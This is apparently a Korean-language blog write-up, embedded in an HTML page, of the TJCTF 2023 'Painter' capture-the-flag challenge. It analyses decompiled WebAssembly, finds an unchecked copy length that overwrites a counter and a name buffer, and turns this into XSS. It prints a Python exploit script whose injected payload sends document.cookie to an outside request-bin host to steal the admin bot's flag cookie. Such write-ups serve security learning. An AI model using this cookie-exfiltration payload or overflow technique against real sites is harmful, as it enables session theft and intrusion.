@@ -1,0 +1,1079 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>TJCTF 2023 - Painter | msh1307</title>
+<meta name="keywords" content="TJCTF_2023, TJCTF_2023 Painter">
+<meta name="description" content="painter 유사 그림판 컨셉인듯 하다.
+Web Assembly 익스플로잇해서 admin bot의 쿠키 탈취가 목적이다.
+Wasm 취약점 분석은 처음 해봐서 생소했다.
+admin-bot.js 파일과 dockerfile, app.py, index.wasm 등이 주어진다.
+Analysis admin-bot.js import flag from &#39;./flag.txt&#39;; function sleep(time) { return new Promise(resolve =&gt; { setTimeout(resolve, time); }); } export default { id: &#39;painter&#39;, name: &#39;painter&#39;, urlRegex: /^https:\/\/painter\.tjc\.tf\//, timeout: 10000, handler: async (url, ctx) =&gt; { const page = await ctx.newPage(); await page.goto(&#39;https://painter.tjc.tf&#39;, { waitUntil: &#39;domcontentloaded&#39; }); await page.">
+<meta name="author" content="">
+<link rel="canonical" href="https://msh1307.kr/blog/tjctf_2023_painter/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d9c43e0c7cae3b38c51e79921ad3cf2685d9811a56593a817d9b57ac4fdebf2b.css" integrity="sha256-2cQ&#43;DHyuOzjFHnmSGtPPJoXZgRpWWTqBfZtXrE/evys=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-BR89V2WEC0');
+</script>
+<link rel="icon" href="https://msh1307.kr/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://msh1307.kr/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://msh1307.kr/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://msh1307.kr/apple-touch-icon.png">
+<link rel="mask-icon" href="https://msh1307.kr/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="TJCTF 2023 - Painter" />
+<meta property="og:description" content="painter 유사 그림판 컨셉인듯 하다.
+Web Assembly 익스플로잇해서 admin bot의 쿠키 탈취가 목적이다.
+Wasm 취약점 분석은 처음 해봐서 생소했다.
+admin-bot.js 파일과 dockerfile, app.py, index.wasm 등이 주어진다.
+Analysis admin-bot.js import flag from &#39;./flag.txt&#39;; function sleep(time) { return new Promise(resolve =&gt; { setTimeout(resolve, time); }); } export default { id: &#39;painter&#39;, name: &#39;painter&#39;, urlRegex: /^https:\/\/painter\.tjc\.tf\//, timeout: 10000, handler: async (url, ctx) =&gt; { const page = await ctx.newPage(); await page.goto(&#39;https://painter.tjc.tf&#39;, { waitUntil: &#39;domcontentloaded&#39; }); await page." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://msh1307.kr/blog/tjctf_2023_painter/" /><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2023-05-29T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2023-05-29T00:00:00&#43;00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="TJCTF 2023 - Painter"/>
+<meta name="twitter:description" content="painter 유사 그림판 컨셉인듯 하다.
+Web Assembly 익스플로잇해서 admin bot의 쿠키 탈취가 목적이다.
+Wasm 취약점 분석은 처음 해봐서 생소했다.
+admin-bot.js 파일과 dockerfile, app.py, index.wasm 등이 주어진다.
+Analysis admin-bot.js import flag from &#39;./flag.txt&#39;; function sleep(time) { return new Promise(resolve =&gt; { setTimeout(resolve, time); }); } export default { id: &#39;painter&#39;, name: &#39;painter&#39;, urlRegex: /^https:\/\/painter\.tjc\.tf\//, timeout: 10000, handler: async (url, ctx) =&gt; { const page = await ctx.newPage(); await page.goto(&#39;https://painter.tjc.tf&#39;, { waitUntil: &#39;domcontentloaded&#39; }); await page."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Blogs",
+      "item": "https://msh1307.kr/blog/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "TJCTF 2023 - Painter",
+      "item": "https://msh1307.kr/blog/tjctf_2023_painter/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "TJCTF 2023 - Painter",
+  "name": "TJCTF 2023 - Painter",
+  "description": "painter 유사 그림판 컨셉인듯 하다.\nWeb Assembly 익스플로잇해서 admin bot의 쿠키 탈취가 목적이다.\nWasm 취약점 분석은 처음 해봐서 생소했다.\nadmin-bot.js 파일과 dockerfile, app.py, index.wasm 등이 주어진다.\nAnalysis admin-bot.js import flag from \u0026#39;./flag.txt\u0026#39;; function sleep(time) { return new Promise(resolve =\u0026gt; { setTimeout(resolve, time); }); } export default { id: \u0026#39;painter\u0026#39;, name: \u0026#39;painter\u0026#39;, urlRegex: /^https:\\/\\/painter\\.tjc\\.tf\\//, timeout: 10000, handler: async (url, ctx) =\u0026gt; { const page = await ctx.newPage(); await page.goto(\u0026#39;https://painter.tjc.tf\u0026#39;, { waitUntil: \u0026#39;domcontentloaded\u0026#39; }); await page.",
+  "keywords": [
+    "TJCTF_2023", "TJCTF_2023 Painter"
+  ],
+  "articleBody": "painter 유사 그림판 컨셉인듯 하다.\nWeb Assembly 익스플로잇해서 admin bot의 쿠키 탈취가 목적이다.\nWasm 취약점 분석은 처음 해봐서 생소했다.\nadmin-bot.js 파일과 dockerfile, app.py, index.wasm 등이 주어진다.\nAnalysis admin-bot.js import flag from './flag.txt'; function sleep(time) { return new Promise(resolve =\u003e { setTimeout(resolve, time); }); } export default { id: 'painter', name: 'painter', urlRegex: /^https:\\/\\/painter\\.tjc\\.tf\\//, timeout: 10000, handler: async (url, ctx) =\u003e { const page = await ctx.newPage(); await page.goto('https://painter.tjc.tf', { waitUntil: 'domcontentloaded' }); await page.setCookie({ name: 'flag', value: flag.trim(), domain: 'painter.tjc.tf', }); await sleep(1000); await page.goto(url, { timeout: 10000, waitUntil: 'domcontentloaded' }); await sleep(10000); } }; admin bot 사이트 접속하면 url을 받아서 거기에 요청을 보내는 것을 알 수 있다.\n쿠키에 flag가 들어있다.\n쿠키 탈취가 목적이다.\nDockerfile FROM python:3.8.5-slim-buster RUN pip install flask gunicorn WORKDIR /app COPY . . EXPOSE 5000 ENTRYPOINT [\"gunicorn\", \"-b\", \"0.0.0.0:5000\", \"-t\", \"4\", \"app:app\"] app.py from flask import Flask, render_template, redirect, request from uuid import uuid4 app = Flask(__name__) images = {} @app.route('/') def index(): return render_template('index.html') @app.route('/save', methods=['POST']) def post_image(): img, name = request.json['img'], request.json['name'] id = uuid4() images[id] = { 'img': img, 'name': name } return redirect('/img/' + str(id)) @app.route('/img/') def image_id(id): if id not in images: return redirect('/') img = images[id]['img'] name = images[id]['name'] return render_template('index.html', px=img, name=name, saved=True) if __name__ == '__main__': app.run(debug=True) 이미지를 저장하거나 볼 수 있는 것 같다.\nindex.html \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e \u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"\u003e \u003cstyle\u003e body { height: 100vh; width: 100%; margin: 0; display: grid; justify-items: center; align-items: center; text-align: left; } #options { display: flex; flex-direction: row; justify-content: space-between; } #canvas { border: 1px solid black; height: 75vh; max-height: 1000px; image-rendering: pixelated; } \u003c/style\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv\u003e \u003ch1 id=\"name-h1\"\u003e\u003c/h1\u003e \u003ccanvas id=\"canvas\" tabindex=\"-1\"\u003e\u003c/canvas\u003e \u003cdiv\u003e \u003cinput type=\"color\" id=\"color-picker\"\u003e \u003cselect id=\"layers\"\u003e \u003coption value=\"0\"\u003eTop Layer\u003c/option\u003e \u003coption value=\"1\"\u003eMiddle Layer\u003c/option\u003e \u003coption value=\"2\"\u003eBottom Layer\u003c/option\u003e \u003c/select\u003e \u003cinput type=\"text\" id=\"name\" placeholder=\"Name\"\u003e \u003cbutton id=\"save\"\u003eSave\u003c/button\u003e \u003c/div\u003e \u003c/div\u003e \u003cscript type=\"text/javascript\"\u003e const canvas = document.getElementById('canvas'); Module = { canvas: canvas }; window.addEventListener('keydown', (e) =\u003e { e.stopImmediatePropagation(); }, true); window.addEventListener('keyup', (e) =\u003e { e.stopImmediatePropagation(); }, true); const strToCharArr = (str) =\u003e { const ptr = _malloc(str.length + 1); Module.stringToUTF8(str, ptr, str.length + 1); return ptr; }; const base64ToArr = (enc) =\u003e { const binary = atob(enc); const bytes = new Uint8Array(binary.length); for (let i = 0; i \u003c bytes.length; i++) { bytes[i] = binary.charCodeAt(i); } return bytes; } const arrToCharArr = (arr) =\u003e { const ptr = _malloc(arr.length); Module.writeArrayToMemory(arr, ptr); return ptr; } const setName = () =\u003e { const name = UTF8ToString(_getName()); document.getElementById('name-h1').innerHTML = name; } Module.onRuntimeInitialized = () =\u003e { _clearCanvas(); {% if saved %} const px = '{{ px }}'; const name = '{{ name }}'; _clearCanvas(); const bin = base64ToArr(px); // get img binary const arr = arrToCharArr(bin); _copyCanvas(arr, bin.length); _setName(strToCharArr(name), name.length); {% endif %} document.addEventListener('mousemove', (e) =\u003e { const rect = canvas.getBoundingClientRect(); const scale = canvas.width / rect.width; _draw((e.clientX - rect.left) * scale, (e.clientY - rect.top) * scale); }); document.addEventListener('mousedown', (e) =\u003e { _toggleLeftMouseButton(1); }); document.addEventListener('mouseup', (e) =\u003e { _toggleLeftMouseButton(0); }); document.getElementById('color-picker').addEventListener('input', (e) =\u003e { const c = e.target.value.match(/[0-9a-fA-F]{2}/g).map(v =\u003e parseInt(v, 16)); _setColor(...c); }); document.getElementById('layers').addEventListener('change', (e) =\u003e { _setLayer(parseInt(e.target.value)); }); document.getElementById('name').addEventListener('input', (e) =\u003e { const name = e.target.value; _setName(strToCharArr(name), name.length); }); document.getElementById('save').addEventListener('click', (e) =\u003e { const out = new Uint8Array(4 * canvas.width * canvas.height * 3); for (let i = 0; i \u003c 3; i++) { const layerPtr = _getLayer(i); const layer = new Uint8Array(Module.HEAPU8.buffer, layerPtr, 4 * canvas.width * canvas.height); out.set(layer, 4 * canvas.width * canvas.height * i); } const binary = btoa(String.fromCharCode(...out)); const name = document.getElementById('name').value; fetch('/save', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ name: name, img: binary }) }).then((res) =\u003e { if (res.status === 200) { navigator.clipboard.writeText(res.url); alert('Save URL copied to clipboard!'); } else { alert('Failed to save!'); } }); }) }; \u003c/script\u003e \u003cscript src=\"/static/index.js\"\u003e\u003c/script\u003e \u003c/body\u003e \u003c/html\u003e 저장할때 /save로 보내는 것을 알 수 있다.\nwasm function들을 사용해서 처리한다.\nindex.js에서 export 하는 부분을 확인할 수 있다.\nindex.js ... var asm = createWasm(); /** @type {function(...*):?} */ var ___wasm_call_ctors = createExportWrapper(\"__wasm_call_ctors\"); /** @type {function(...*):?} */ var _getName = Module[\"_getName\"] = createExportWrapper(\"getName\"); /** @type {function(...*):?} */ var _getLayer = Module[\"_getLayer\"] = createExportWrapper(\"getLayer\"); /** @type {function(...*):?} */ var _setName = Module[\"_setName\"] = createExportWrapper(\"setName\"); /** @type {function(...*):?} */ var _free = createExportWrapper(\"free\"); /** @type {function(...*):?} */ var _copyCanvas = Module[\"_copyCanvas\"] = createExportWrapper(\"copyCanvas\"); /** @type {function(...*):?} */ var _setColor = Module[\"_setColor\"] = createExportWrapper(\"setColor\"); /** @type {function(...*):?} */ var _setLayer = Module[\"_setLayer\"] = createExportWrapper(\"setLayer\"); /** @type {function(...*):?} */ var _toggleLeftMouseButton = Module[\"_toggleLeftMouseButton\"] = createExportWrapper(\"toggleLeftMouseButton\"); /** @type {function(...*):?} */ var _draw = Module[\"_draw\"] = createExportWrapper(\"draw\"); /** @type {function(...*):?} */ var _clearCanvas = Module[\"_clearCanvas\"] = createExportWrapper(\"clearCanvas\"); /** @type {function(...*):?} */ var _loop = Module[\"_loop\"] = createExportWrapper(\"loop\"); /** @type {function(...*):?} */ var _main = Module[\"_main\"] = createExportWrapper(\"main\"); /** @type {function(...*):?} */ var _malloc = createExportWrapper(\"malloc\"); /** @type {function(...*):?} */ var ___errno_location = createExportWrapper(\"__errno_location\"); /** @type {function(...*):?} */ var ___dl_seterr = createExportWrapper(\"__dl_seterr\"); /** @type {function(...*):?} */ var _fflush = Module[\"_fflush\"] = createExportWrapper(\"fflush\"); /** @type {function(...*):?} */ var _emscripten_stack_init = function() { return (_emscripten_stack_init = Module[\"asm\"][\"emscripten_stack_init\"]).apply(null, arguments); }; /** @type {function(...*):?} */ var _emscripten_stack_get_free = function() { return (_emscripten_stack_get_free = Module[\"asm\"][\"emscripten_stack_get_free\"]).apply(null, arguments); }; /** @type {function(...*):?} */ var _emscripten_stack_get_base = function() { return (_emscripten_stack_get_base = Module[\"asm\"][\"emscripten_stack_get_base\"]).apply(null, arguments); }; /** @type {function(...*):?} */ var _emscripten_stack_get_end = function() { return (_emscripten_stack_get_end = Module[\"asm\"][\"emscripten_stack_get_end\"]).apply(null, arguments); }; ... 대충 함수 export를 해준다.\nindex.wasm 아래 디컴파일러를 사용해서 분석했다.\nwabt보다 훨씬 좋다.\nhttps://github.com/wasmkit/diswasm\nwasm 선형 메모리 얘기는 그냥 오프셋 가지고 메모리에 접근하는 것을 얘기하는 것 같다.\nwasm은 따로 ASLR 같은 메모리 보호 기법이 없다.\nglobal variable같은 것들은 그래서 주소가 하드코딩 되어있는듯? 하다.\nsetName() // O[0] Decompilation of $func238, known as $func5 export \"setName\"; // $func238 is exported to \"setName\" void $func5(int arr, int param1) { // offset=0xc int ar; // offset=0x8 int local_8; // offset=0x4 int local_4; ar = arr; local_8 = param1; label$1: { label$2: { if ((((local_8 \u003e= 0x8) \u0026 0x1) == 0x0)) break label$2; break label$1; }; }; local_8 = local_8; local_4 = 0x0; label$3: { while (1) { if ((((local_4 \u003c local_8) \u0026 0x1) == 0x0)) break label$3; *((unsigned char *) local_4 + 0x2191c) = *((unsigned char *) (ar + local_4)); local_4 = (local_4 + 0x1); break label$4; break ; }; }; *((unsigned char *) local_8 + 0x2191c) = 0x0; $free(ar); return; } 0x2191c가 Name이다.\ncopyCanvas() // O[0] Decompilation of $func239, known as $func6 export \"copyCanvas\"; // $func239 is exported to \"copyCanvas\" void $func6(int target, int length) { // offset=0xc int t; // offset=0x8 int l; t = target; l = length; $memcpy((0x2091c + 0x1008), t, l); // 0x21924 $free(t); return; } 0x21924에 length 만큼 복사한다.\ngetLayer() // O[0] Decompilation of $func237, known as $func4 export \"getLayer\"; // $func237 is exported to \"getLayer\" int $func4(int param0) { // offset=0xc int local_c; local_c = param0; return ((0x2091c + 0x1008) + (local_c \u003c\u003c 0xc)); } 0x21924가 Layer인 것 같다.\nmain() // O[2] Disassembly of $func248, known as $func15 export \"main\"; // $func248 is exported to \"main\" int $func15(int param0, int param1) { // local index=2 int local2; local2 = $func13(); return local2; } func13() // O[2] Disassembly of $func246, known as $func13 int $func13() { // local index=0 int local0; // local index=1 int local1; // local index=2 int local2; // local index=3 int local3; // local index=4 int local4; // local index=5 int local5; // local index=6 int local6; // local index=7 int local7; // local index=8 int local8; // local index=9 int local9; // local index=10 int local10; // local index=11 int local11; // local index=12 int local12; // local index=13 int local13; // local index=14 int local14; local0 = 0x20; $func18(local0); local1 = 0x20; local2 = 0x0; local3 = 0x20914; local4 = 0x20910; $func476(local1, local1, local2, local3, local4); local5 = 0x303; local6 = 0x0; $func80(local5, local6); local7 = 0x0; local8 = 0x20; local9 = $func670(local7, local8, local8, local8, local7, local7, local7, local7); local10 = 0x0; *((unsigned int *) local10 + 0x20918) = local9; local11 = 0x1; local12 = 0x0; local13 = 0x1; fimport_emscripten_set_main_loop(local11, local12, local13); // executes exported function named \"loop\" every tick local14 = 0x0; return local14; } tick 마다 “loop” 함수를 실행한다.\n호스트 환경에서 실행시켜주기 때문에 “loop\"는 export 해야 한다.\nloop() // O[0] Decompilation of $func245, known as $func12 export \"loop\"; // $func245 is exported to \"loop\" void $func12() { // offset=0x1c int local_1c; // offset=0x18 int local_18; // offset=0x14 int local_14; // offset=0x10 int local_10; // offset=0xc int local_c; label$1: { if (((*((unsigned int *) *((unsigned int *) 0x20918)) \u0026 0x2) == 0x0)) break label$1; $func686(*((unsigned int *) 0x20918)); }; local_1c = *((unsigned int *) *((unsigned int *) 0x20918) + 0x14); local_18 = 0x0; label$2: { while (1) { if ((((local_18 \u003c (*((unsigned short *) 0x24924) \u0026 0xffff)) \u0026 0x1) == 0x0)) break label$2; local_14 = 0x0; local_10 = 0x0; label$4: { while (1) { if ((((local_10 \u003c 0x3) \u0026 0x1) == 0x0)) break label$4; label$6: { if ((*((unsigned char *) (((0x2091c + 0x1008) + (local_10 \u003c\u003c 0xc)) + (local_18 + 0x3))) \u0026 0xff)) break label$6; local_14 = local_10; break label$4; }; local_10 = (local_10 + 0x1); break label$5; break ; }; }; *((unsigned char *) local_18 + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u003c\u003c 0xc)) + local_18)); *((unsigned char *) (local_18 + 0x1) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u003c\u003c 0xc)) + (local_18 + 0x1))); *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u003c\u003c 0xc)) + (local_18 + 0x2))); *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u003c\u003c 0xc)) + (local_18 + 0x3))) \u0026 0xff)); // 4번째 -\u003e 0xff 뺴기 local_18 = (local_18 + 0x4); break label$3; break ; }; }; fimport_emscripten_run_script(0x14fac /* \"setName()\" */ ); $memcpy(local_1c, 0x2091c, 0x1000); label$7: { if (((*((unsigned int *) *((unsigned int *) 0x20918)) \u0026 0x2) == 0x0)) break label$7; $func687(*((unsigned int *) 0x20918)); }; local_c = $func489(*((unsigned int *) 0x20910), *((unsigned int *) 0x20918)); $func496(*((unsigned int *) 0x20910)); $func499(*((unsigned int *) 0x20910), local_c, 0x0, 0x0); $func502(*((unsigned int *) 0x20910)); $func488(local_c); return; } 0x2091c에 0x24924만큼 0x21924를 복사한다.\n대충 이제 구조를 그려보면\n0x24924 -\u003e count // while loop copy cnt 0x21924 -\u003e Layers 0x2191c -\u003e Name 0x2091c -\u003e pixels Updated every tick 0x2091c = 0x21924 이런 전역 구조체? 정도로 생각할 수 있다.\n4바이트씩 복사를 해주는데 이상하게 마지막 바이트는 0xff에서 빼서 넣어준다.\nExploitation index.html의 일부를 보면 아래와 같다.\nconst binary = btoa(String.fromCharCode(...out)); const name = document.getElementById('name').value; fetch('/save', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ name: name, img: binary }) }).then((res) =\u003e { if (res.status === 200) { navigator.clipboard.writeText(res.url); alert('Save URL copied to clipboard!'); } else { alert('Failed to save!'); } }); binary는 클라이언트단에서 컨트롤이 가능하다.\n{% if saved %} const px = '{{ px }}'; const name = '{{ name }}'; _clearCanvas(); const bin = base64ToArr(px); // get img binary const arr = arrToCharArr(bin); _copyCanvas(arr, bin.length); _setName(strToCharArr(name), name.length); {% endif %} _copyCanvas를 호출하면서 length에 대한 경계 체크가 없다.\n$memcpy((0x2091c + 0x1008), t, l); // 0x21924 $free(t); l을 컨트롤할 수 있다.\nt는 malloc으로 할당받은 버퍼다.\n0x24924 -\u003e count // while loop copy cnt 0x21924 -\u003e Layers 0x2191c -\u003e Name 0x2091c -\u003e pixels Updated every tick 0x2091c = 0x21924 여기서 overflow를 내서 count를 덮을 수 있다.\n그리고 tick 마다 loop가 호출된다.\nlabel$2: { while (1) { if ((((local_18 \u003c (*((unsigned short *) 0x24924) \u0026 0xffff)) \u0026 0x1) == 0x0)) break label$2; local_14 = 0x0; local_10 = 0x0; label$4: { while (1) { if ((((local_10 \u003c 0x3) \u0026 0x1) == 0x0)) break label$4; label$6: { if ((*((unsigned char *) (((0x2091c + 0x1008) + (local_10 \u003c\u003c 0xc)) + (local_18 + 0x3))) \u0026 0xff)) break label$6; local_14 = local_10; break label$4; }; local_10 = (local_10 + 0x1); break label$5; break ; }; }; *((unsigned char *) local_18 + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u003c\u003c 0xc)) + local_18)); *((unsigned char *) (local_18 + 0x1) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u003c\u003c 0xc)) + (local_18 + 0x1))); *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u003c\u003c 0xc)) + (local_18 + 0x2))); *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u003c\u003c 0xc)) + (local_18 + 0x3))) \u0026 0xff)); // 4번째 -\u003e 0xff 뺴기 local_18 = (local_18 + 0x4); break label$3; break ; }; if ((((local_18 \u003c (*((unsigned short *) 0x24924) \u0026 0xffff)) \u0026 0x1) == 0x0)) break label$2; count를 overflow로 덮어서 얼마나 copy할지를 컨트롤 할 수 있다.\n이때 Layer(0x2091c + 0x1008)가 pixels(0x2091c)로 4 바이트씩 copy된다.\nif ((((local_10 \u003c 0x3) \u0026 0x1) == 0x0)) break label$4; label$6: { if ((*((unsigned char *) (((0x2091c + 0x1008) + (local_10 \u003c\u003c 0xc)) + (local_18 + 0x3))) \u0026 0xff)) break label$6; local_14 = local_10; 여기 if문에서 local_14가 0이 아니게 되어버리면, « 0xc 때문에 0x1000 단위로 커져버린다.\n여기서 if문을 안타고 들어가게 하려면 local_18은 증가하게 냅두고 그냥 payload를 넉넉하게 채우면 우회할 수 있다.\n0x24924 -\u003e count // while loop copy cnt 0x21924 -\u003e Layers 0x2191c -\u003e Name 0x2091c -\u003e pixels Updated every tick 0x2091c = 0x21924 이때 적절한 count로 덮고 copy를 통해서 pixels에서 Name을 덮어버리면 나중에 loop에서 index.html의 setName을 호출해서 tick 마다 Name을 업데이트한다.\nconst setName = () =\u003e { const name = UTF8ToString(_getName()); document.getElementById('name-h1').innerHTML = name; } *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u003c\u003c 0xc)) + (local_18 + 0x2))); *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u003c\u003c 0xc)) + (local_18 + 0x3))) \u0026 0xff)); // 4번째 -\u003e 0xff 뺴기 local_18 = (local_18 + 0x4); break label$3; break ; }; }; fimport_emscripten_run_script(0x14fac /* \"setName()\" */ ); 원래 flask 템플릿에서 막혀서 xss를 트리거할 수 없을텐데 Name을 덮고 wasm 단에서 바꾸게 해버리면 xss를 트리거할 수 있다.\nExploit script import base64 import requests from pwn import p8,p16 BASE_URL = 'https://painter.tjc.tf' attackerURL = 'https://qivuygm.request.dreamhack.games' ''' 0x24924 -\u003e count // while loop copy cnt 0x21924 -\u003e Layers 0x2191c -\u003e Name 0x2091c -\u003e pixels Updated every tick 0x2091c = 0x21924 ''' injection = f\"{attackerURL}?flag='+document.cookie\u003e\" def paygen(string : bytes): ''' *((unsigned char *) local_18 + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u003c\u003c 0xc)) + local_18)); *((unsigned char *) (local_18 + 0x1) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u003c\u003c 0xc)) + (local_18 + 0x1))); *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u003c\u003c 0xc)) + (local_18 + 0x2))); *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 \u003c\u003c 0xc)) + (local_18 + 0x3))) \u0026 0xff)); // 4번째 -\u003e 0xff 뺴기 ''' pay = b'' for i in range(len(string)): if (i+1) % 4 == 0: pay += p8(0xff-string[i]) else: pay += p8(string[i]) return pay pay = b'\\xff'*(0x2191c- 0x2091c) pay += paygen(injection.encode()) pay += b'\\x00'*4 pay += b'\\xff' * ((0x24924- 0x21924)-len(pay)) # pixels overflow ''' export \"copyCanvas\"; // $func239 is exported to \"copyCanvas\" void $func6(int target, int length) { // offset=0xc int t; // offset=0x8 int l; t = target; l = length; $memcpy((0x2091c + 0x1008), t, l); // 0x21924 $free(t); return; } const bin = base64ToArr(px); // get img binary const arr = arrToCharArr(bin); _copyCanvas(arr, bin.length); ''' pay += p16(0x1000+len(injection)+4) pay += b'\\xff'*(0x70-2) # print(pay[0x1000:0x1030]) # print(hex(pay[0x3000]),hex(pay[0x3001])) # print(hex(len(pay))) re = requests.post(f'{BASE_URL}/save', json={ 'img': base64.b64encode(pay).decode(), 'name': 'exploit' }) print(re.url) admin bot한테 url주고 돌리면 flag 나온다.\ntjctf{m0n4_l1s4_1s_0verr4t3d_e2187c9a}\n",
+  "wordCount" : "2542",
+  "inLanguage": "en",
+  "datePublished": "2023-05-29T00:00:00Z",
+  "dateModified": "2023-05-29T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://msh1307.kr/blog/tjctf_2023_painter/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "msh1307",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://msh1307.kr/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header sticky-header">
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-BR89V2WEC0');
+    </script>
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://msh1307.kr" accesskey="h" title="msh1307 (Alt + H)">msh1307</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://msh1307.kr/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/blog" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/categories" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
